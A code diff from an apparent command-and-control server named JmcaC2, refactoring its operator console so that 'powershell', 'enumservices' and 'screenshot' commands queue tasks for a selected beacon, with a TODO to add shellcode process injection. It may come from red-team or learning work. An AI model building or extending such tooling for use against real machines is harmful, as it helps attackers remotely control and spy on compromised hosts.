@@ -79,23 +79,6 @@ namespace JmcaC2
                     case "use":
                         SetCurrentBeaconSession(CmdArgs);
                         break;
-
-                    case "tasks":
-                        PrintTasks();
-                        break;
-                    //TODO: process injection command, with shellcode passed as DATA in BeaconTask
-
-                    case "powershell":
-                        if (CurrentBeacon == null)
-                        {
-                            Console.ForegroundColor = ConsoleColor.Red;
-                            Console.WriteLine(" No active beacon selected. Run: use BeaconName");
-                            Console.ForegroundColor = ConsoleColor.White;
-                            break;
-                        }
-                        BeaconTasks.Add(new BeaconTask(CurrentBeacon.Name, CmdPrefix, CmdArgs));
-                        Console.WriteLine($"Added task for {CurrentBeacon.Name}");
-                        break;
                     //  Dictionary<string, string> command = new Dictionary<string, string> { { CmdPrefix, CmdArgs } };
                     case "stop":
                         serverRunning = false;
@@ -105,6 +88,24 @@ namespace JmcaC2
                     case "exit":
                         programRunning = false;
                         break;
+
+                    case "tasks":
+                        PrintTasks();
+                        break;
+                    //TODO: process injection command, with shellcode passed as DATA in BeaconTask
+
+                    case "powershell":
+                        CreateTask(CmdPrefix, CmdArgs);
+                        break;
+
+                    case "enumservices":
+                        CreateTask(CmdPrefix, CmdArgs);
+                        break;
+
+                    case "screenshot":
+                        CreateTask(CmdPrefix, CmdArgs);
+                        break;
+
 
                     // add more commands as needed :)
 
@@ -118,7 +119,19 @@ namespace JmcaC2
 
         // View currently active beacon connections
 
+        static private void CreateTask(string CmdPrefix, string CmdArgs)
+        {
 
+            if (CurrentBeacon == null)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine(" No active beacon selected. Run: use BeaconName");
+                Console.ForegroundColor = ConsoleColor.White;
+                return;
+            }
+            BeaconTasks.Add(new BeaconTask(CurrentBeacon.Name, CmdPrefix, CmdArgs));
+            Console.WriteLine($"Added task for {CurrentBeacon.Name}");
+        }
 
         static private string GenerateClientName()
         {
